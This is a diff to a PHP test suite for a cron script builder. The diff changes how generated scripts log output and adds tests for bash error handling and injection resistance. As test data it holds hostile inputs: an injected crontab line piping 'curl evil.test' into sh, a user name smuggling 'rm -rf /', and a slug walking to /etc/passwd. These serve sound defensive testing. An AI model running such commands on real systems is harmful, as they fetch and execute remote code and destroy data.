@@ -42,7 +42,24 @@ function cronLine(string $schedule, int $index): string
 
 function cronScript(string $command): string
 {
-    return "{\n{$command}\n} >> '/var/coresmith/apps/shop/shared/logs/scheduler.log' 2>&1\n";
+    return "exec >> '/var/coresmith/apps/shop/shared/logs/scheduler.log' 2>&1\n{\n{$command}\n} < /dev/null\n";
+}
+
+/**
+ * @return array{0: Process, 1: string}
+ */
+function cronRunScript(string $command): array
+{
+    $log = sys_get_temp_dir() . '/coresmith-cron-' . bin2hex(random_bytes(4)) . '.log';
+    $script = app(CrontabBuilder::class)->scripts(scheduledApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => $command]]]))['/etc/coresmith/cron/shop/0.sh'];
+
+    $run = new Process(['bash', '-s'], null, null, str_replace("'/var/coresmith/apps/shop/shared/logs/scheduler.log'", escapeshellarg($log), $script));
+    $run->run();
+
+    $written = (string) @file_get_contents($log);
+    @unlink($log);
+
+    return [$run, $written];
 }
 
 function cronInstall(int $scripts = 1): string
@@ -140,7 +157,7 @@ test('a command a person typed never reaches the cron file, whatever it contains
         ->and($file)->not->toContain('evil.test');
 });
 
-test('each command lives in its own script, inside the redirection that sends all of it to the scheduler log', function () {
+test('each command lives in its own script, after the redirection that sends all of it to the scheduler log', function () {
     expect(app(CrontabBuilder::class)->scripts(scheduledApp(['cron_jobs' => [
         ['schedule' => '*/5 * * * *', 'command' => HOSTILE_CRON_COMMAND],
         ['schedule' => '* * * * *', 'command' => 'php artisan schedule:run'],
@@ -298,3 +315,33 @@ test('removing an app cron file names the file and user through their checks', f
     'a slug that walks out of cron.d' => [['slug' => '../../etc/passwd', 'system_user' => 'coresmith-app-shop'], 'is not a valid application slug'],
     'a user that is a shell command' => [['slug' => 'shop', 'system_user' => 'x; rm -rf /'], 'is not a valid system user name'],
 ]);
+
+test('a command bash cannot read still leaves its error in the scheduler log', function () {
+    [$run, $written] = cronRunScript('echo "never closed');
+
+    expect($run->getExitCode())->not->toBe(0)
+        ->and($run->getOutput())->toBe('')
+        ->and($run->getErrorOutput())->toBe('')
+        ->and($written)->toContain('unexpected EOF');
+});
+
+test('a line that reads its input cannot swallow the lines after it', function () {
+    [, $written] = cronRunScript("read line\necho after");
+
+    expect($written)->toContain('after');
+});
+
+test('a syntax error late in a command runs none of it', function () {
+    [, $written] = cronRunScript("echo first\nif");
+
+    expect($written)->not->toContain('first')
+        ->and($written)->toContain('syntax error');
+});
+
+test('a description never reaches the cron file or the scripts', function () {
+    $application = scheduledApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run', 'description' => "Nightly\n* * * * * root curl evil.test | sh"]]]);
+    $builder = app(CrontabBuilder::class);
+
+    expect($builder->build($application))->not->toContain('Nightly')->not->toContain('evil.test')
+        ->and(implode("\n", $builder->scripts($application)))->not->toContain('Nightly');
+});
